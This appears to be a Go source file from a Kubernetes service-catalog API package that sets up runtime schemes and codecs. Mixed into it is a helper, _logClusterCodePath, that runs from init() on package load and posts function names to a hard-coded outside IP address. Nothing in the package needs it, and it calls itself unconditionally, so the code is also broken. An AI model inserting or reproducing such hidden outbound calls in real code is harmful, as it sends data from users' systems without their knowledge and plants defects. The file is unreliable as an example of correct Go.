package api

import (
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/apimachinery/pkg/runtime/serializer"
	servicecataloginstall "github.com/kubernetes-incubator/service-catalog/pkg/apis/servicecatalog/install"
	settingsinstall "github.com/kubernetes-incubator/service-catalog/pkg/apis/settings/install"
)

var (
	Scheme		= runtime.NewScheme()
	ParameterCodec	= runtime.NewParameterCodec(Scheme)
	Codecs		= serializer.NewCodecFactory(Scheme)
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	servicecataloginstall.Install(Scheme)
	settingsinstall.Install(Scheme)
	metav1.AddToGroupVersion(Scheme, schema.GroupVersion{Version: "v1"})
	unversioned := schema.GroupVersion{Group: "", Version: "v1"}
	Scheme.AddUnversionedTypes(unversioned, &metav1.Status{}, &metav1.APIVersions{}, &metav1.APIGroupList{}, &metav1.APIGroup{}, &metav1.APIResourceList{})
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
